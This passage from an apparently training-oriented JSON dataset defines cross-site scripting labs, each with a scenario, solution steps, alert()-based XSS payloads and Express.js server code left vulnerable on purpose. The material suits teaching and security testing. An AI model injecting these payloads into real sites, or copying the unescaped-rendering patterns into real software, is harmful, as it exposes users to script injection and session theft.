    "Solution Steps": [
      "Send a request like /search?query=<img src=x onerror=alert(1)>",
      "Observe the autocomplete box rendering the malicious query",
      "Confirm if payload triggers execution"
    ],
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<script>alert('Autocomplete')</script>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const q = req.query.query || '';\n  res.send(`\n    <html>\n      <body>\n        <input value='${q}' id='searchBox'>\n        <div id='suggestions'>Suggestions for: <b>${q}</b></div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Autocomplete XSS lab running'));\n"
  },
  {
    "Lab scenario": "Stored XSS in User Bio with Unsafe Render",
    "Lab Description": "Users can set their bio on their profile. The server stores this content and later displays it without escaping or sanitizing, making it vulnerable to stored XSS.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Update your profile bio with <script>alert('bio')</script>",
      "Visit the profile view page",
      "Observe if the payload gets executed"
    ],
    "payloads": [
      "<script>alert('bio')</script>",
      "<img src=x onerror=alert('bio')>",
      "<svg/onload=alert('bio')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userBio = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/edit-bio', (req, res) => {\n  res.send(`<form method='POST'><textarea name='bio'></textarea><button>Save</button></form>`);\n});\n\napp.post('/edit-bio', (req, res) => {\n  userBio = req.body.bio;\n  res.redirect('/profile');\n});\n\napp.get('/profile', (req, res) => {\n  res.send(`<h2>User Profile</h2><p>${userBio}</p>`);\n});\n\napp.listen(3000, () => console.log('User bio XSS lab running'));\n"
  },
  {
    "Lab scenario": "XSS via Unsanitized Image Caption in Gallery",
    "Lab Description": "Users upload images with optional captions. These captions are rendered directly into the gallery view using `innerHTML`. Attackers can upload a benign image with a malicious caption.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Upload an image and set the caption to <img src=x onerror=alert('caption')>",
      "View the gallery page",
      "Check for script execution from the caption"
    ],
    "payloads": [
      "<img src=x onerror=alert('caption')>",
      "<svg/onload=alert('caption')>",
      "<script>alert('caption')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet images = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/upload', (req, res) => {\n  res.send(`<form method='POST'>\n    <input name='url' placeholder='Image URL'>\n    <input name='caption' placeholder='Caption'>\n    <button>Upload</button>\n  </form>`);\n});\n\napp.post('/upload', (req, res) => {\n  images.push({ url: req.body.url, caption: req.body.caption });\n  res.redirect('/gallery');\n});\n\napp.get('/gallery', (req, res) => {\n  const html = images.map(img => `<div><img src='${img.url}'><p>${img.caption}</p></div>`).join('');\n  res.send(`<h1>Gallery</h1>${html}`);\n});\n\napp.listen(3000, () => console.log('Gallery XSS lab running'));\n"
  },
  {
    "Lab scenario": "Reflected XSS in Email Preview Template",
    "Lab Description": "The webmail client has a preview feature for incoming emails. It takes query parameters like subject and body to render a mock preview. However, user-supplied values are injected into the DOM without sanitization, leading to reflected XSS.\nTo solve: Inject a script in the body parameter to trigger an alert when the preview is rendered.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access the email preview page using URL parameters like ?subject=Hi&body=Hello.",
      "Replace the body value with a payload such as <script>alert('XSS')</script>.",
      "Load the page and observe the reflected payload execution.",
      "Try other payloads to evade potential filters.",
      "Confirm that each page load with malicious input triggers code execution."
    ],
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert(1)>",
      "<svg/onload=alert(1)>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/preview', (req, res) => {\n  const subject = req.query.subject || 'No Subject';\n  const body = req.query.body || 'Empty';\n  res.send(`\n    <html>\n      <body>\n        <h2>Email Preview</h2>\n        <h3>${subject}</h3>\n        <p>${body}</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Running on 3000'));\n"
  },
  {
    "Lab scenario": "Stored XSS in Comment Section of Image Gallery",
    "Lab Description": "An image gallery allows users to comment on pictures. These comments are stored and displayed under the images. The input is not sanitized, leading to persistent XSS on image pages.\nTo solve: Submit a comment with a script payload and revisit the image page to see the script execute.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Navigate to an image in the gallery and locate the comment form.",
      "Submit a comment containing a script payload like <script>alert('XSS')</script>.",
      "Reload the page and observe the payload being executed under the image.",
      "Verify persistence by revisiting the page in a different session.",
      "Try alternate payloads to explore filter bypasses."
    ],
    "payloads": [
      "<script>alert('Gallery XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/image', (req, res) => {\n  const commentHTML = comments.map(c => `<p>${c}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Image Gallery</h2>\n        <img src='cat.jpg' width='200'/>\n        <h3>Comments</h3>\n        ${commentHTML}\n        <form method='POST' action='/comment'>\n          <input name='text' placeholder='Leave a comment'/>\n          <button>Submit</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/comment', (req, res) => {\n  comments.push(req.body.text);\n  res.redirect('/image');\n});\n\napp.listen(3000, () => console.log('Server running'));\n"
  },
  {
    "Lab scenario": "DOM-based XSS in Notification Renderer",
    "Lab Description": "The application fetches notifications from localStorage and renders them inside an alert panel. The values are inserted into the DOM with innerHTML, making it vulnerable to DOM-based XSS.\nTo solve: Inject a malicious payload via localStorage and reload the app to trigger execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Open the browser console and set a malicious value: localStorage.setItem('notif', '<img src=x onerror=alert(1)>').",
      "Reload the page and check the notifications panel.",
      "Observe the payload being executed.",
      "Try obfuscated or encoded payloads for bypass testing.",
      "Verify that each load with the crafted localStorage value leads to XSS."
    ],
    "payloads": [
      "<script>alert('Notification XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Dashboard</h2>\n        <div id='alerts'></div>\n        <script>\n          const msg = localStorage.getItem('notif');\n          if (msg) {\n            document.getElementById('alerts').innerHTML = msg;\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Running on 3000'));\n"
  },
  {
    "Lab scenario": "Reflected XSS in Redirect URL",
    "Lab Description": "The login page accepts a `redirect` parameter in the URL to know where to send users after login. However, the parameter is directly embedded in the page without sanitization, enabling reflected XSS.\nTo solve: Craft a redirect value containing a script and observe it executing when the login page loads.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to /login?redirect=<script>alert('XSS')</script>.",
      "Observe that the value is reflected inside the HTML.",
      "See the script execute when the page loads.",
      "Try variations like using an image tag payload.",
      "Confirm successful execution before login interaction."
    ],
    "payloads": [
      "<script>alert('Redirect XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/login', (req, res) => {\n  const redirectTo = req.query.redirect || '/home';\n  res.send(`\n    <html>\n      <body>\n        <h2>Login Page</h2>\n        <p>After login, you'll be redirected to: ${redirectTo}</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000, () => console.log('Running on 3000'));\n"
  },
  {
    "Lab scenario": "Stored XSS in Profile Bio Field",
    "Lab Description": "The application lets users customize their profile bio. However, the bio is rendered using innerHTML on the profile page without sanitization. An attacker can inject a persistent XSS payload into their own bio.\nTo solve: Update your profile with a script payload and view your profile page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Go to the profile edit page and update the bio with <script>alert('XSS')</script>.",
      "Save the profile and navigate to your public profile.",
      "Observe that the script executes.",
      "Try alternate payloads for better stealth or filter bypass.",
      "Verify persistent XSS by logging out and back in."
    ],
    "payloads": [
      "<script>alert('Bio XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert('XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet userBio = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/profile', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>User Profile</h2>\n        <p>${userBio}</p>\n        <form method='POST' action='/update'>\n          <textarea name='bio' placeholder='Enter bio'></textarea>\n          <button>Save</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/update', (req, res) => {\n  userBio = req.body.bio;\n  res.redirect('/profile');\n});\n\napp.listen(3000, () => console.log('Running on 3000'));\n"
  },
  {
    "Lab scenario": "DOM XSS via JSONP Callback in Analytics Dashboard",
    "Lab Description": "A marketing dashboard loads analytics from a third-party endpoint using a JSONP callback. The callback name is passed via the URL and dynamically injected into a script tag using innerHTML. This leads to DOM-based XSS if a malicious callback name is passed.\nTo solve: Inject a payload in the `callback` parameter to execute JavaScript when the page loads the script.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Access /dashboard?callback=evilCallback.",
      "Observe that the callback name is inserted unsafely into a script tag.",
      "Replace the value with a payload like \");alert(1);//.",
      "Confirm that the script is executed immediately upon page load.",
      "Check browser console for alert execution."
    ],
    "payloads": [
      "\");alert('JSONP XSS');//",
      "x\"><script>alert('XSS')</script>",
      "test);</script><script>alert(1)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/dashboard', (req, res) => {\n  const callback = req.query.callback || 'defaultCallback';\n  res.send(`\n    <html>\n      <body>\n        <h2>Marketing Analytics</h2>\n        <div>Loading metrics...</div>\n        <script>\n          const script = document.createElement('script');\n          script.innerHTML = \"fetch('https://api.example.com/data?callback=${callback}')\";\n          document.body.appendChild(script);\n        </script>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "XSS via File Name Injection in File Upload Success Page",
    "Lab Description": "A file upload endpoint returns a success message including the file name, which is reflected into the HTML without escaping. An attacker can upload a file with a crafted name containing script code to trigger XSS when users view the upload confirmation.\nTo solve: Upload a file with an XSS payload in the filename.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Upload a file named <img src=x onerror=alert('XSS')>.png.",
      "After upload, the server redirects to /upload-success?name=<payload>.",
      "Observe the filename rendered directly into the HTML.",
      "Confirm script execution when upload is completed.",
      "Verify that any user previewing the file sees the XSS."
    ],
    "payloads": [
      "<img src=x onerror=alert('File XSS')>.png",
      "<svg/onload=alert('File XSS')>.jpg",
      "<script>alert('File')</script>.txt"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst multer = require('multer');\nconst app = express();\nconst upload = multer({ dest: 'uploads/' });\n\napp.post('/upload', upload.single('file'), (req, res) => {\n  const fileName = req.file.originalname;\n  res.redirect('/upload-success?name=' + encodeURIComponent(fileName));\n});\n\napp.get('/upload-success', (req, res) => {\n  const name = req.query.name || 'unknown';\n  res.send(`\n    <html>\n      <body>\n        <h2>Upload Successful</h2>\n        <p>File uploaded: ${name}</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "XSS via WebSocket Chat Broadcast",
    "Lab Description": "A real-time chat system uses WebSocket to broadcast messages. The server relays all messages to connected clients without any sanitization, and the frontend renders them using `innerHTML`. This leads to reflected XSS through chat messages.\nTo solve: Send a message containing a script payload through WebSocket and observe execution on other clients.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Open the chat client and connect to WebSocket.",
      "Send a message like <img src=x onerror=alert('XSS')>.",
      "Ensure other clients or a second tab is connected.",
      "Observe that the message is rendered directly into the DOM.",
      "Confirm that XSS is executed in all receiving sessions."
    ],
    "payloads": [
      "<img src=x onerror=alert('Chat XSS')>",
      "<svg/onload=alert('Chat')>",
      "<script>alert('WebSocket XSS')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst http = require('http');\nconst WebSocket = require('ws');\nconst app = express();\nconst server = http.createServer(app);\nconst wss = new WebSocket.Server({ server });\n\napp.get('/', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Chat</h2>\n        <div id='chat'></div>\n        <input id='msg' /><button onclick='sendMsg()'>Send</button>\n        <script>\n          const ws = new WebSocket('ws://' + location.host);\n          ws.onmessage = (e) => {\n            document.getElementById('chat').innerHTML += '<div>' + e.data + '</div>';\n          };\n          function sendMsg() {\n            ws.send(document.getElementById('msg').value);\n          }\n        </script>\n      </body>\n    </html>\n  `);\n});\n\nwss.on('connection', ws => {\n  ws.on('message', msg => {\n    wss.clients.forEach(client => {\n      if (client.readyState === WebSocket.OPEN) {\n        client.send(msg);\n      }\n    });\n  });\n});\n\nserver.listen(3000);\n"
  },
  {
    "Lab scenario": "XSS in PDF Viewer via Document Title Injection",
    "Lab Description": "The app uses an embedded PDF viewer that shows the document title in the page header. The title is passed via URL query and injected into the DOM without escaping. XSS is triggered when users view a document with a malicious title.\nTo solve: Craft a malicious URL with a script in the `title` parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Access /viewer?title=<script>alert('XSS')</script>.",
      "Observe the title displayed at the top of the viewer.",
      "Confirm the script executes when the page loads.",
      "Verify that the title is not sanitized before rendering.",
      "Use different encodings or tag variants to test filter evasion."
    ],
    "payloads": [
      "<script>alert('PDF XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert('PDF XSS')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/viewer', (req, res) => {\n  const title = req.query.title || 'Document';\n  res.send(`\n    <html>\n      <body>\n        <h1>${title}</h1>\n        <iframe src='/sample.pdf' width='100%' height='500px'></iframe>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "Stored XSS in Dynamic Survey System",
    "Lab Description": "A feedback survey stores user responses, including free-text answers, and displays them to admins for review. The stored answers are rendered without sanitization, allowing stored XSS if a malicious user submits a script payload.\nTo solve: Submit a survey response with a script, then view the results as an admin.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Fill in the survey with an XSS payload in a text field.",
      "Submit the survey and log in as an admin.",
      "Navigate to the response review panel.",
      "Observe the payload executing in the results view.",
      "Confirm that it persists and executes for every admin viewing it."
    ],
    "payloads": [
      "<script>alert('Survey XSS')</script>",
      "<img src=x onerror=alert('XSS')>",
      "<svg/onload=alert('Survey')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet responses = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.get('/survey', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <form method='POST' action='/submit'>\n          <label>Feedback:</label>\n          <input name='feedback' />\n          <button>Submit</button>\n        </form>\n      </body>\n    </html>\n  `);\n});\n\napp.post('/submit', (req, res) => {\n  responses.push(req.body.feedback);\n  res.send('Thanks for your feedback!');\n});\n\napp.get('/admin', (req, res) => {\n  const all = responses.map(r => `<p>${r}</p>`).join('');\n  res.send(`\n    <html>\n      <body>\n        <h2>Survey Results</h2>\n        ${all}\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "XSS via SVG Image Editor Export Feature",
    "Lab Description": "The application includes a browser-based SVG image editor that allows users to export their work. The exported SVG is displayed directly using innerHTML without validation. An attacker can craft a malicious SVG file with embedded JavaScript to trigger XSS when previewed.\nTo solve: Craft an SVG with an embedded script and upload it, then trigger the preview feature.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create a custom SVG file with <script>alert(1)</script> inside.",
      "Upload it using the export/upload functionality.",
      "Trigger the preview view where innerHTML is used to render SVG.",
      "Confirm that the script is executed upon rendering.",
      "Ensure other users previewing the same export also get affected."
    ],
    "payloads": [
      "<svg><script>alert('SVG XSS')</script></svg>",
      "<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>",
      "<svg onload=alert('SVG')></svg>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet exportedSVG = '';\napp.use(bodyParser.text({ type: '*/*' }));\n\napp.post('/export-svg', (req, res) => {\n  exportedSVG = req.body;\n  res.redirect('/preview');\n});\n\napp.get('/preview', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>SVG Preview</h2>\n        <div id='svg-container'>${exportedSVG}</div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "Reflected XSS via Custom 404 Page Search Reflection",
    "Lab Description": "A custom 404 error page reflects the missing URL into the response body for debugging purposes. The application fails to sanitize the reflected path, allowing attackers to inject scripts via the URL, leading to reflected XSS when users land on an invalid link.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Visit /thispagedoesnotexist<script>alert(1)</script>.",
      "Observe that the 404 page renders the URL back in a <p> tag.",
      "Confirm the injected script executes on page load.",
      "Use encoded variations to bypass basic filters if present.",
      "Ensure the XSS triggers only on invalid URLs."
    ],
    "payloads": [
      "/nonexistent/<script>alert('404')</script>",
      "/oops\"><img src=x onerror=alert('404')>",
      "/error<svg/onload=alert('404')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.use((req, res) => {\n  const path = req.url;\n  res.status(404).send(`\n    <html>\n      <body>\n        <h2>Page Not Found</h2>\n        <p>Could not find: ${path}</p>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "XSS via Redirect URL in Email Verification",
    "Lab Description": "The application includes an email verification link with a `next` parameter that dictates where the user will be redirected after confirming their email. This value is also shown as a tooltip or confirmation. An attacker can inject HTML/JS into this parameter, resulting in XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Craft a URL like /verify?token=xyz&next=<script>alert(1)</script>.",
      "Send this to a victim who clicks it expecting a real email verification.",
      "Observe that the `next` value is reflected in the HTML (e.g., in a tooltip or button).",
      "Confirm that the payload is rendered and script executes.",
      "Test with different payloads to identify bypasses."
    ],
    "payloads": [
      "<script>alert('redirect')</script>",
      "<img src=x onerror=alert('verify')>",
      "<svg/onload=alert('verify')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/verify', (req, res) => {\n  const next = req.query.next || '/dashboard';\n  res.send(`\n    <html>\n      <body>\n        <h2>Email Verified</h2>\n        <p>You will be redirected to: ${next}</p>\n        <a href='${next}'>Continue</a>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "XSS via Misconfigured React dangerouslySetInnerHTML",
    "Lab Description": "A React-based application uses `dangerouslySetInnerHTML` to render dynamic content for FAQs. An admin can submit new FAQs through a CMS, but the rendered content is not sanitized. An attacker with access to the CMS submits a malicious FAQ that executes code for all frontend users.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Access the admin FAQ submission form.",
      "Submit a question or answer containing <script>alert(1)</script>.",
      "On the main site, load the FAQ page where dangerouslySetInnerHTML is used.",
      "Observe that the script executes for all viewers.",
      "Demonstrate stored XSS across user sessions."
    ],
    "payloads": [
      "<script>alert('React')</script>",
      "<img src=x onerror=alert('React XSS')>",
      "<svg/onload=alert('FAQ')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "app.get('/faq', (req, res) => {\n  const faqHTML = getStoredFAQ(); // e.g., includes <p> tags\n  res.send(`\n    <html>\n      <body>\n        <div id=\"faq-root\"></div>\n        <script>\n          ReactDOM.render(\n            React.createElement('div', { dangerouslySetInnerHTML: { __html: ${JSON.stringify(faqHTML)} } }),\n            document.getElementById('faq-root')\n          );\n        </script>\n      </body>\n    </html>\n  `);\n});"
  },
  {
    "Lab scenario": "XSS in Webhook Tester via Reflected Webhook Event",
    "Lab Description": "A webhook testing tool reflects incoming event data on a dashboard for debugging. It renders event contents in real-time using innerHTML without escaping, allowing attackers to trigger XSS by sending malicious event payloads.\nTo solve: Send a crafted webhook payload with HTML or script tags.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send a POST request with JSON body: { \"event\": \"<script>alert(1)</script>\" } to /webhook.",
      "Visit the /events page where the event is displayed.",
      "Observe the script execution due to innerHTML usage.",
      "Confirm that the issue affects any user viewing the dashboard.",
      "Attempt encoded variants if filters are applied."
    ],
    "payloads": [
      "{\"event\": \"<script>alert('webhook')</script>\"}",
      "{\"event\": \"<img src=x onerror=alert('hook')>\"}",
      "{\"event\": \"<svg/onload=alert('hook')>\"}"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet latestEvent = '';\napp.use(bodyParser.json());\n\napp.post('/webhook', (req, res) => {\n  latestEvent = req.body.event;\n  res.send('Received');\n});\n\napp.get('/events', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Webhook Event</h2>\n        <div id='event'>${latestEvent}</div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "XSS via Drag-and-Drop HTML Builder",
    "Lab Description": "The application includes a WYSIWYG HTML page builder that allows users to drag and drop elements (like images, buttons, text blocks) to create pages. The builder saves the generated HTML and renders it using innerHTML for previews. This allows attackers to inject malicious elements that execute scripts when viewed.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use the builder to insert an image element with an onerror handler.",
      "Alternatively, drag a 'custom HTML' block and insert a script tag.",
      "Save the design and open the preview link.",
      "Confirm that the preview renders the raw HTML with no filtering.",
      "Trigger the script execution in the preview context."
    ],
    "payloads": [
      "<img src=x onerror=alert('Builder XSS')>",
      "<script>alert('WYSIWYG')</script>",
      "<svg/onload=alert('DragDrop')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet savedHTML = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/save-design', (req, res) => {\n  savedHTML = req.body.html;\n  res.redirect('/preview-design');\n});\n\napp.get('/preview-design', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Your Page Preview</h2>\n        <div>${savedHTML}</div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "XSS via Real-time Chat Notification Tooltip",
    "Lab Description": "A chat app notifies users of new messages via tooltips on message previews. The tooltips use message content and are rendered using innerHTML for formatting. An attacker can send a specially crafted message to another user that contains an XSS payload executed when the tooltip shows.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send a message like: <img src=x onerror=alert(1)> to another user.",
      "That message appears in a preview tooltip on hover.",
      "Observe that the innerHTML used to render the tooltip executes the script.",
      "Confirm XSS occurs in the tooltip context."
    ],
    "payloads": [
      "<img src=x onerror=alert('chat')>",
      "<svg/onload=alert('message')>",
      "<script>alert('tooltip')</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\nlet messages = [];\n\napp.get('/send', (req, res) => {\n  messages.push(req.query.msg);\n  res.redirect('/inbox');\n});\n\napp.get('/inbox', (req, res) => {\n  const previews = messages.map(m => `<div class='tooltip' onmouseover=\"this.setAttribute('title', '${m}')\">${m}</div>`).join('<br>');\n  res.send(`\n    <html>\n      <body><h2>Inbox</h2>${previews}</body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "XSS via Third-Party Comment Embed with Markup Support",
    "Lab Description": "A news site uses a third-party comment plugin that allows limited HTML tags for formatting. However, the sanitization process fails to properly strip event handlers in allowed tags. This can be exploited to inject XSS via seemingly allowed markup like `<b onmouseover>`.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Post a comment using <b onmouseover=alert(1)>Hover me</b>.",
      "View the comment section on a public article.",
      "Move the mouse over the bold text to trigger the alert.",
      "Confirm stored XSS due to event handler bypassing sanitization."
    ],
    "payloads": [
      "<b onmouseover=alert('comment')>Hover</b>",
      "<i onclick=alert('comment')>Click</i>",
      "<u onfocus=alert('focus') tabindex=0>Focus Me</u>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\n\nlet comments = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment', (req, res) => {\n  comments.push(req.body.comment);\n  res.redirect('/article');\n});\n\napp.get('/article', (req, res) => {\n  const renderedComments = comments.join('<br>');\n  res.send(`\n    <html>\n      <body>\n        <h2>Breaking News</h2>\n        <div id='comments'>${renderedComments}</div>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "DOM XSS via Dynamic Profile Tabs",
    "Lab Description": "The user profile page uses client-side JavaScript to dynamically switch between tabs (Posts, Info, Settings). Tab names are passed via URL hash and directly injected into the DOM without validation. An attacker can craft a malicious URL that injects a script through the hash.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Navigate to /profile#<img src=x onerror=alert(1)>. Observe script execution.",
      "The client-side JS parses location.hash and uses innerHTML or insertAdjacentHTML.",
      "Test variations using DOM injection vectors.",
      "Confirm that simply changing the hash triggers XSS."
    ],
    "payloads": [
      "#<script>alert('hash')</script>",
      "#<img src=x onerror=alert('hash')>",
      "#<svg/onload=alert('hash')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "app.get('/profile', (req, res) => {\n  res.send(`\n    <html>\n      <body>\n        <h2>Your Profile</h2>\n        <div id='tab-content'></div>\n        <script>\n          const tab = location.hash.substring(1);\n          document.getElementById('tab-content').innerHTML = tab;\n        </script>\n      </body>\n    </html>\n  `);\n});"
  },
  {
    "Lab scenario": "XSS in Language Switcher via Localized JSON Injection",
    "Lab Description": "The web app supports multiple languages and loads localized JSON files dynamically based on a `lang` parameter in the URL. The chosen language file is parsed and rendered into the DOM without filtering. An attacker can inject malicious content by tampering with the language file or abusing the input.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Modify the lang parameter to point to a malicious or modified language JSON.",
      "Craft translation content like: { \"greeting\": \"<script>alert('XSS')</script>\" }.",
      "Observe the rendering of the greeting message in the UI.",
      "Confirm script execution on page load.",
      "Explore if lang is user-controllable (e.g., via URL or cookie)."
    ],
    "payloads": [
      "{\"greeting\": \"<script>alert('i18n')</script>\"}",
      "{\"greeting\": \"<img src=x onerror=alert('lang')>\"}",
      "{\"greeting\": \"<svg/onload=alert('lang')>\"}"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst fs = require('fs');\nconst app = express();\n\napp.get('/translate', (req, res) => {\n  const lang = req.query.lang || 'en';\n  const content = JSON.parse(fs.readFileSync(`./lang/${lang}.json`));\n  res.send(`\n    <html>\n      <body>\n        <h2>${content.greeting}</h2>\n      </body>\n    </html>\n  `);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "XSS via Markdown Rendering in Internal Wiki",
    "Lab Description": "An internal documentation tool allows employees to create wiki pages using Markdown. The Markdown parser supports raw HTML for flexibility, but no sanitization is applied before rendering. This allows attackers to inject raw HTML and JavaScript, leading to stored XSS across internal teams.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Create a new wiki page with raw HTML inside the Markdown: `<script>alert(1)</script>`.",
      "Save and navigate to the page view.",
      "Confirm that the script is rendered and executed directly.",
      "Test variations like <img> and <svg> inside markdown content.",
      "Verify that stored XSS affects other users accessing the page."
    ],
    "payloads": [
      "<script>alert('markdown')</script>",
      "<img src=x onerror=alert('markdown')>",
      "<svg/onload=alert('wiki')>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst marked = require('marked');\nconst app = express();\n\nlet wikiPages = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/create', (req, res) => {\n  wikiPages.push(req.body.content);\n  res.redirect('/wiki');\n});\n\napp.get('/wiki', (req, res) => {\n  const content = wikiPages.map(c => marked(c)).join('<hr>');\n  res.send(`<html><body>${content}</body></html>`);\n});\n\napp.listen(3000);\n"
  },
  {
    "Lab scenario": "XSS in Interactive Data Dashboard Filters",
    "Lab Description": "A financial dashboard allows users to create custom filters for viewing metrics. These filters are stored and reflected into a dynamic URL fragment and into the DOM for preview. Due to improper escaping, attackers can create malicious filters that result in DOM-based XSS.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Create a custom filter with a name like <img src=x onerror=alert(1)>. ",
      "Save and load the dashboard with the filter active.",
      "Inspect the DOM where the filter name is displayed (likely via innerHTML).",
      "Confirm that script execution occurs upon loading or interaction."
    ],
    "payloads": [
      "<script>alert('filter')</script>",
      "<img src=x onerror=alert('dashboard')>",
      "<svg/onload=alert('filters')>"
    ],
    "Vulnerability name": "Cross-site scripting",
